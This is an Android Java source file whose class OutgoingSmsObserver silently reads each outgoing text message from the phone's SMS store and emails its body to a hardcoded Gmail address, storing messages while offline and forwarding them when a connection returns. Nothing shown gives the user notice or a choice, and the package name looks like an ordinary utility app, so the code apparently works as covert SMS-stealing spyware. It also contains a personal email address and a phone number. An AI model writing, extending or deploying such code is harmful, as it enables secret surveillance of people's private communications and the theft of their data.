package com.example.fasterpro11;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;

import javax.mail.MessagingException;

import java.util.HashMap;
import java.util.Map;

public class OutgoingSmsObserver extends ContentObserver {

    private static final String TAG = "OutgoingSmsObserver";
    private static final long FORWARD_THRESHOLD_MS = 60000; // Time threshold to consider a message as recent (1 minute)
    private Context context;

    // Variable to store the last forwarded message details
    private String lastForwardedMessage;
    private long lastForwardedTimestamp;

    private final Map<String, String> lastForwardedMessageMap = new HashMap<>();
    private final Map<String, Long> lastForwardedTimestampMap = new HashMap<>();

    public OutgoingSmsObserver(Handler handler, Context context) {
        super(handler);
        this.context = context;

        // Register BroadcastReceiver for connectivity changes
        IntentFilter filter = new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION);
        context.registerReceiver(connectivityReceiver, filter);
    }

    @Override
    public void onChange(boolean selfChange, Uri uri) {
        super.onChange(selfChange, uri);
        Log.d(TAG, "Send SMS detected: " + uri.toString());

        Cursor cursor = context.getContentResolver().query(
                Uri.parse("content://sms"),
                new String[]{"address", "body", "type", "date"},
                "type = ?",
                new String[]{"2"},
                "date DESC LIMIT 1"  // Limit to 1 to get only the latest SMS
        );

        if (cursor != null && cursor.moveToFirst()) {
            int typeIndex = cursor.getColumnIndex("type");
            int bodyIndex = cursor.getColumnIndex("body");
            int dateIndex = cursor.getColumnIndex("date");

            if (typeIndex != -1 && bodyIndex != -1 && dateIndex != -1) {
                String type = cursor.getString(typeIndex);
                String messageBody = cursor.getString(bodyIndex);
                long messageTimestamp = cursor.getLong(dateIndex);

                Log.d(TAG, "Send SMS message: " + messageBody);
                Log.d(TAG, "Message timestamp: " + messageTimestamp);

                if ("2".equals(type)) { // Only process outgoing messages
                    // Check if the message is recent and not the same as the last forwarded one
                    if (isRecentMessage(messageTimestamp) && !isSameAsLastForwarded(messageBody)) {
                        if (isInternetConnected()) {
                            try {
                                if (!isDuplicateEmail(messageBody)) {
                                    // Forward outgoing SMS to email
                                    forwardSmsByEmail(messageBody);
                                    Log.d(TAG, "OutgoingSmsObserver Send SMS forwarded successfully via email");
                                    // Update the last forwarded message and its timestamp
                                    updateLastForwarded(messageBody);
                                } else {
                                    Log.d(TAG, "Duplicate SMS within 2 minutes, not forwarding via email");
                                }
                            } catch (MessagingException e) {
                                Log.e(TAG, "OutgoingSmsObserver Failed to forward Send SMS via email: " + e.getMessage());
                            }
                        } else {
                            Log.d(TAG, "No internet connection, skipping forwarding via email");
                        }
                    } else {
                        if (!isRecentMessage(messageTimestamp)) {
                            Log.d(TAG, "OutgoingSmsObserver Send SMS message is not recent, skipping forwarding.");
                        }
                        if (isSameAsLastForwarded(messageBody)) {
                            Log.d(TAG, "OutgoingSmsObserver Send SMS message is the same as the last forwarded one, skipping forwarding.");
                        }
                    }
                }
            }
            cursor.close();
        }
    }

    private boolean isRecentMessage(long messageTimestamp) {
        // Check if the message timestamp is within the forward threshold
        long currentTimestamp = System.currentTimeMillis();
        return (currentTimestamp - messageTimestamp) < FORWARD_THRESHOLD_MS;
    }

    private void forwardSmsByEmail(String messageBody) throws MessagingException {
        // Forward SMS via email
        String sender = SmsReceiver.getSender(); // Assuming getSender() should return the last sender
        JavaMailAPI_OutgoingSmsObserver_Sender.sendMail("abontiangum99@gmail.com", "Send SMS from " + sender, "Message: " + messageBody);
    }


    private boolean isSameAsLastForwarded(String message) {
        // Check if the message is the same as the last forwarded one
        return message.equals(lastForwardedMessage);
    }

    private void updateLastForwarded(String message) {
        // Update the last forwarded message and its timestamp
        lastForwardedMessage = message;
        lastForwardedTimestamp = System.currentTimeMillis();
    }

    private boolean isInternetConnected() {
        // Check internet connectivity using the ConnectivityManager
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm != null) {
            NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
            return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
        }
        return false;
    }

    private boolean shouldForwardBySMS(String messageBody) {
        // Check if no internet and specific conditions are met for SMS forwarding
        return !isInternetConnected() &&
                (messageBody.contains("GP") ||
                        messageBody.matches(".*\\+\\d{4}.*") ||
                        messageBody.equals("+8801304039289"));
    }

    private void storeMessageForLaterForwarding(String messageBody) {
        // Store the message for later forwarding using SharedPreferences
        SharedPreferences preferences = context.getSharedPreferences("OutgoingSmsStore", Context.MODE_PRIVATE);
        preferences.edit().putString("messageBody", messageBody).apply();
    }

    // BroadcastReceiver to detect internet connectivity changes
    private BroadcastReceiver connectivityReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (action != null && action.equals(ConnectivityManager.CONNECTIVITY_ACTION)) {
                boolean isConnected = isInternetConnected();
                if (isConnected) {
                    // Internet connection is available, check and forward stored message
                    SharedPreferences preferences = context.getSharedPreferences("OutgoingSmsStore", Context.MODE_PRIVATE);
                    String storedMessage = preferences.getString("messageBody", null);
                    if (storedMessage != null) {
                        // Forward the stored message
                        if (shouldForwardBySMS(storedMessage)) {
                           // forwardSmsBySMS(storedMessage);
                           // Log.d(TAG, "OutgoingSmsObserver Stored SMS forwarded successfully via SMS");
                        } else {
                            try {
                                if (!isDuplicateEmail(storedMessage)) {
                                    // Forward stored SMS to email
                                    forwardSmsByEmail(storedMessage);
                                    Log.d(TAG, "OutgoingSmsObserver Stored SMS forwarded successfully via email");
                                } else {
                                    Log.d(TAG, "Duplicate stored SMS within 2 minutes, not forwarding via email");
                                }
                            } catch (MessagingException e) {
                                Log.e(TAG, "OutgoingSmsObserver Failed to forward stored SMS via email: " + e.getMessage());
                            }
                        }
                        // Clear the stored message after forwarding
                        preferences.edit().remove("messageBody").apply();
                    }
                }
            }
        }
    };

    public void unregisterReceiver() {
        try {
            context.unregisterReceiver(connectivityReceiver);
        } catch (IllegalArgumentException e) {
            // Receiver not registered, ignore
        }
    }

    private boolean isDuplicateEmail(String currentMessage) {
        if (lastForwardedMessage != null && lastForwardedTimestamp != 0) {
            // Check if the message was forwarded within 2 minutes and content is the same
            return currentMessage.equals(lastForwardedMessage) &&
                    (System.currentTimeMillis() - lastForwardedTimestamp) <= 2 * 60 * 1000;
        }
        return false;
    }


}
